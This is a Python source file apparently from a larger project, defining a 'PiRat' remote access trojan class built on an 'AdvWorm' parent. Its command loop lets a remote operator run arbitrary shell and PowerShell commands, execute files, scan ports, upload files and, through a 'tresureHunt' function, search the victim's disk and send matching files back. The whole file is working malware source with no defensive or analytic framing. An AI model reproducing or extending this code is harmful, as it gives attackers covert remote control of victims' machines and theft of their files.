

import subprocess

class PiRat(AdvWorm):
    def __init__(self):
        super().__init__()
        self.name = "PI_Rat"
        self.IG = IndexGen()
        self.portLock = threading.Lock()
        self.portScanResult = []
        self._dnsAddr = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "208.67.222.222", "9.9.9.9", "4.2.2.2", "84.200.69.80", "149.112.112.112"]
        self._manualID = self.IG.generate()
        self._manualDown = False
    
    def ChangeDir(self, target: str) -> None:
        try:
            os.chdir(target)
            self.sendMsg(f"Change Dir Successfull: {self.getPwd()}")
        except (OSError, FileNotFoundError) as e:
            self.sendMsg(f"ERROR: {e}")
    
    def _manDownChek(self) -> None:
        if self._manualDown:
            return
        msg = self.makeSysMsg(["w", "manual", "manual downloading files", self._manualID])
        self.sendMsg(msg)
        sleep(0.5)
        self._manualDown = True

    def getIPaddr(self) -> Union[str, bool]:
        for dns in self._dnsAddr:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((dns, 53))
                local_ip = sock.getsockname()[0]
                print("LOCAL_IP: ", local_ip)
                return local_ip
            except Exception as e:
                print("ERROR: ", e)
        return None

    
    def _scanPort(self, host: str, port_list: list) -> None:
        for port in port_list:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                sock.connect((host, port))
                with self.portLock:
                    self.portScanResult.append(f"OPEN PORT: {host}:{port}")
                sock.close()
            except Exception as e:
                print("ERROR: ", e)
                sock.close()
                continue
    
    
    def scanHostPort(self, min_port: int, max_port: int, host: str = None, th_no: int = 5) -> None:
        if not host:
            host = self.getIPaddr()
        elif not host[0].isdigit():
            host = socket.gethostbyname(host)
        if not host:
            host = "127.0.0.1"       
        try:
            min_port = int(min_port)
            max_port = int(max_port)
        except:
            return
        work = []
        buff = []
        self.sendMsg(f"Start scaning port: {host}:{min_port} - {max_port}. Wait for results")
        for x in range(min_port, max_port + 1):
            if (x % th_no) == 0:
                work.append(buff)
                buff = []
            buff.append(x)
        work.append(buff)
        scaners = []
        for w in work:
            scaners.append(Thread(target=self._scanPort, args=(host, w), daemon=True))
        for scn in scaners:
            scn.start()
        for scn in scaners:
            scn.join()
        print("END SCAN")
        result = "\n".join(self.portScanResult)
        self.sendMsg(f"Port Scan Result:\n{result}")
        self.portScanResult = []

    def runFile(self, name: str, dirpath: str = None) -> None:
        if not dirpath:
            fpath = os.path.join(os.getcwd(), name)
        else:
            fpath = os.path.join(dirpath, name)
        
        try:
            out = subprocess.run(fpath, capture_output=True, shell=True, text=True)
            if out.returncode == 0:
                self.sendMsg(f"File {name} run successfull")
            else:
                self.sendMsg(f"ERROR: {out.stderr}")
        except:
            self.sendMsg("ERROR")
    
    def findPowerShell(self) -> None:
        try:
            winp = os.environ["WINDIR"]
        except:
            try:
                winp = os.environ["SYSTEMROOT"]
            except:
                self.powerShell = "powershell"
                return
        winp = os.path.join(winp, "system32")
        for r,d, file in os.walk(winp, topdown=False):
            for f in file:
                if f == "powershell.exe":
                    self.powerShell = os.path.join(r, f)
                    print(self.powerShell)
                    return
    
    def runPowerShell(self, cmd: str = "") -> None:
        try:
            out = subprocess.run(f"{self.powerShell} {cmd}", capture_output=True, shell=True, text=True)
            if out.returncode == 0:
                print("success")
                print(out.stdout)
                self.sendMsg(str(out.stdout))
            else:
                print(out.stderr)
                self.sendMsg(str(out.stderr))
        except Exception as e:
            print("ERROR: ", e)
    
    def runPowerShellScript(self, scripts: list) -> None:
        try:
            out = subprocess.run([self.powerShell] + scripts, capture_output=True, text=True)
            if out.returncode == 0:
                print(out.stdout)
                self.sendMsg(str(out.stdout))
            else:
                print(out.stderr)
                self.sendMsg(str(out.stderr))
        except Exception as e:
            print("ERROR: ", e)
    
    def shellCMDcommand(self, cmd: str) -> None:
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, shell=True)
            if out.returncode == 0:
                self.sendMsg(str(out.stdout))
            else:
                self.sendMsg(str(out.stderr))
        except:
            self.sendMsg("[!!] ERROR: CMD execute command [!!]")
    

    
    def SendFile(self, name: str, target: str, dir_index: str) -> None:
        c = 0
        while c < 10:
            out = self.sendFile(name, target, dir_index)
            if out == "wait":
                c += 1
                sleep(self._pauseSend)
                continue
            else:
                break

    
    def tresureHunt(self, search_file: str, target: str = None) -> None:
        if not target:
            target = self.getPwd()
        dir_id = self.IG.generate()
        msg = self.makeSysMsg(["w", "TresureHunt", f"Searching files: {search_file}", dir_id])
        self.sendMsg(msg)
        sleep(0.5)
        for r,d, files in os.walk(target):
            for f in files:
                print(f)
                if search_file in f:
                    self.SendFile(name=f, target=r, dir_index=dir_id)
        self.sendMsg("Tresures sends")
                
    def recivePSript(self, text: str) -> None:
        _b = text.split("\n")
        buff = []
        for b in _b:
            if b == "" or b == " " or b == "\n":
                continue
            buff.append(b + "\n")
        self.runPowerShellScript(buff)


    def execCMD(self, cmd: str) -> None:
        cmd = self.unpackSysMsg(cmd)
        print("CMD SPLIT: ", cmd)
        match cmd[0]:
            case "UPL":
                self.downloadFile(cmd[1], cmd[2], cmd[3])
            case "SP":
                if len(cmd) < 4:
                    self.scanHostPort(cmd[1], cmd[2])
                elif len(cmd) == 4:
                    self.scanHostPort(cmd[1], cmd[2], cmd[3])
            case "RUN":
                self.runFile(cmd[1])
            case "cd":
                self.ChangeDir(cmd[1])
            case "pwd":
                self.sendMsg(self.getPwd())
            case "ps":
                self.runPowerShell(cmd[1])
            case "send":
                self._manDownChek()
                self.sendFile(name=cmd[1], dir_index=self._manualID)
            case "hunt":
                self.tresureHunt(cmd[1])
            case "pss":
                self.recivePSript(cmd[1])
            case "cmd":
                self.shellCMDcommand(cmd[1])

    def _preConn(self) -> None:
        self.findPowerShell()
    
    def Work(self) -> bool:
        self.sendMsg("Wait for command")
        while True:
            recv = self.reciveMsg()
            print("RECV: ", recv)
            if not recv:
                break
            if recv.startswith(self.sys_msg):
                self.execCMD(recv)
            elif recv == "QQ":
                break
        return True
    
    